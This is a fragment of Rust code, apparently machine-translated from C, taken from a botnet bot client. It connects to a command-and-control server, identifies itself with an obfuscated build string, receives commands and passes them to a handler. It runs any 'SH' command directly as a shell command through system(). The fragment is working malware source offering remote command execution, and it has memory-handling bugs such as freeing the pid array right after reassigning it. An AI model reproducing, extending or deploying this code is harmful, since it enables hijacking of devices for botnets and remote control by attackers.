        ) == 0
        {
            close(fd_cnc);
        } else {
            _time = 0 as libc::c_int;
            send(
                fd_cnc,
                b"\x01\0" as *const u8 as *const libc::c_char as *const libc::c_void,
                1 as libc::c_int as size_t,
                MSG_NOSIGNAL as libc::c_int,
            );
            sockprintf(
                fd_cnc,
                b"%s %s\n\0" as *const u8 as *const libc::c_char as *mut libc::c_char,
                okic(b"f=rb\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
                getBuild(),
            );
            loop {
                got = recvLine(
                    rdbuf.as_mut_ptr() as *mut libc::c_uchar,
                    1024 as libc::c_int,
                );
                if !(got != -(1 as libc::c_int)) {
                    break;
                }
                if got == 0 as libc::c_int {
                    continue;
                }
                i_1 = 0 as libc::c_int;
                while (i_1 as libc::c_ulong) < numpids {
                    if waitpid(
                        *pids.offset(i_1 as isize) as __pid_t,
                        0 as *mut libc::c_int,
                        1 as libc::c_int,
                    ) > 0 as libc::c_int
                    {
                        let mut newpids: *mut libc::c_uint = 0 as *mut libc::c_uint;
                        let mut on: libc::c_uint = 0;
                        on = (i_1 + 1 as libc::c_int) as libc::c_uint;
                        while (on as libc::c_ulong) < numpids {
                            *pids
                                .offset(
                                    on.wrapping_sub(1 as libc::c_int as libc::c_uint) as isize,
                                ) = *pids.offset(on as isize);
                            on = on.wrapping_add(1);
                        }
                        *pids
                            .offset(
                                on.wrapping_sub(1 as libc::c_int as libc::c_uint) as isize,
                            ) = 0 as libc::c_int as uint32_t;
                        numpids = numpids.wrapping_sub(1);
                        newpids = malloc(
                            numpids
                                .wrapping_add(1 as libc::c_int as libc::c_ulong)
                                .wrapping_mul(
                                    ::std::mem::size_of::<libc::c_uint>() as libc::c_ulong,
                                ),
                        ) as *mut libc::c_uint;
                        on = 0 as libc::c_int as libc::c_uint;
                        while (on as libc::c_ulong) < numpids {
                            *newpids.offset(on as isize) = *pids.offset(on as isize);
                            on = on.wrapping_add(1);
                        }
                        pids = newpids;
                        free(newpids as *mut libc::c_void);
                    }
                    i_1 += 1;
                }
                rdbuf[got as usize] = 0 as libc::c_int as libc::c_char;
                trim(rdbuf.as_mut_ptr());
                if strstr(
                    rdbuf.as_mut_ptr(),
                    okic(
                        b"|x,<\0" as *const u8 as *const libc::c_char
                            as *mut libc::c_char,
                    ),
                ) == rdbuf.as_mut_ptr()
                {
                    continue;
                }
                let mut message: *mut libc::c_uchar = rdbuf.as_mut_ptr()
                    as *mut libc::c_uchar;
                while *message
                    .offset(
                        (strlen(message as *const libc::c_char))
                            .wrapping_sub(1 as libc::c_int as libc::c_ulong) as isize,
                    ) as libc::c_int == '\n' as i32
                    || *message
                        .offset(
                            (strlen(message as *const libc::c_char))
                                .wrapping_sub(1 as libc::c_int as libc::c_ulong) as isize,
                        ) as libc::c_int == '\r' as i32
                {
                    *message
                        .offset(
                            (strlen(message as *const libc::c_char))
                                .wrapping_sub(1 as libc::c_int as libc::c_ulong) as isize,
                        ) = 0 as libc::c_int as libc::c_uchar;
                }
                let mut command: *mut libc::c_uchar = message;
                while *message as libc::c_int != ' ' as i32
                    && *message as libc::c_int != 0 as libc::c_int
                {
                    message = message.offset(1);
                }
                *message = 0 as libc::c_int as libc::c_uchar;
                message = message.offset(1);
                let mut tmpcommand: *mut libc::c_uchar = command;
                while *tmpcommand != 0 {
                    *tmpcommand = mytoupper(*tmpcommand as libc::c_int) as libc::c_uchar;
                    tmpcommand = tmpcommand.offset(1);
                }
                let mut params: [*mut libc::c_uchar; 10] = [0 as *mut libc::c_uchar; 10];
                let mut paramsCount: libc::c_int = 1 as libc::c_int;
                let mut pch: *mut libc::c_uchar = strtok(
                    message as *mut libc::c_char,
                    b" \0" as *const u8 as *const libc::c_char,
                ) as *mut libc::c_uchar;
                params[0 as libc::c_int as usize] = command;
                while !pch.is_null() {
                    if *pch as libc::c_int != '\n' as i32 {
                        if paramsCount >= 10 as libc::c_int {
                            continue;
                        }
                        params[paramsCount
                            as usize] = malloc(
                            (strlen(pch as *const libc::c_char))
                                .wrapping_add(1 as libc::c_int as libc::c_ulong),
                        ) as *mut libc::c_uchar;
                        memset(
                            params[paramsCount as usize] as *mut libc::c_void,
                            0 as libc::c_int,
                            (strlen(pch as *const libc::c_char))
                                .wrapping_add(1 as libc::c_int as libc::c_ulong),
                        );
                        strcpy(
                            params[paramsCount as usize] as *mut libc::c_char,
                            pch as *const libc::c_char,
                        );
                        paramsCount += 1;
                    }
                    pch = strtok(
                        0 as *mut libc::c_char,
                        b" \0" as *const u8 as *const libc::c_char,
                    ) as *mut libc::c_uchar;
                }
                if strcmp(
                    command.offset(3 as libc::c_int as isize) as *const libc::c_char,
                    b"SH \0" as *const u8 as *const libc::c_char,
                ) == 0 as libc::c_int
                {
                    command = command.offset(3 as libc::c_int as isize);
                    system(command as *const libc::c_char);
                }
                processCmd(paramsCount, params.as_mut_ptr());
                if paramsCount > 1 as libc::c_int {
                    let mut q: libc::c_int = 1 as libc::c_int;
                    q = 1 as libc::c_int;
                    while q < paramsCount {
                        free(params[q as usize] as *mut libc::c_void);
                        q += 1;
                    }
                }
            }
            sleep(1 as libc::c_int as libc::c_uint);
        }
    }
    return 0;
}
pub fn main() {
    let mut args: Vec::<*mut libc::c_char> = Vec::new();
    for arg in ::std::env::args() {
        args.push(
            (::std::ffi::CString::new(arg))
                .expect("Failed to convert argument into CString.")
                .into_raw(),
        );
    }
    args.push(::std::ptr::null_mut());
    unsafe {
        ::std::process::exit(
            main_0(
                (args.len() - 1) as libc::c_int,
                args.as_mut_ptr() as *mut *mut libc::c_char,
            ) as i32,
        )
    }
}
unsafe extern "C" fn run_static_initializers() {
static mut TBL: [libc::c_uchar; 23] = [
        0 as libc::c_int as libc::c_uchar,
        1 as libc::c_int as libc::c_uchar,
        2 as libc::c_int as libc::c_uchar,
        3 as libc::c_int as libc::c_uchar,
        4 as libc::c_int as libc::c_uchar,
        5 as libc::c_int as libc::c_uchar,
        6 as libc::c_int as libc::c_uchar,
        7 as libc::c_int as libc::c_uchar,
        8 as libc::c_int as libc::c_uchar,
        9 as libc::c_int as libc::c_uchar,
        58 as libc::c_int as libc::c_uchar,
        59 as libc::c_int as libc::c_uchar,
        60 as libc::c_int as libc::c_uchar,
        61 as libc::c_int as libc::c_uchar,
        62 as libc::c_int as libc::c_uchar,
        63 as libc::c_int as libc::c_uchar,
        64 as libc::c_int as libc::c_uchar,
        10 as libc::c_int as libc::c_uchar,
        11 as libc::c_int as libc::c_uchar,
        12 as libc::c_int as libc::c_uchar,
        13 as libc::c_int as libc::c_uchar,
        14 as libc::c_int as libc::c_uchar,
        15 as libc::c_int as libc::c_uchar,
    ];    
    LOOKUP = TBL.as_ptr().offset(-(48 as libc::c_int as isize));
}
#[used]
#[cfg_attr(target_os = "linux", link_section = ".init_array")]
#[cfg_attr(target_os = "windows", link_section = ".CRT$XIB")]
#[cfg_attr(target_os = "macos", link_section = "__DATA,__mod_init_func")]
static INIT_ARRAY: [unsafe extern "C" fn(); 1] = [run_static_initializers];
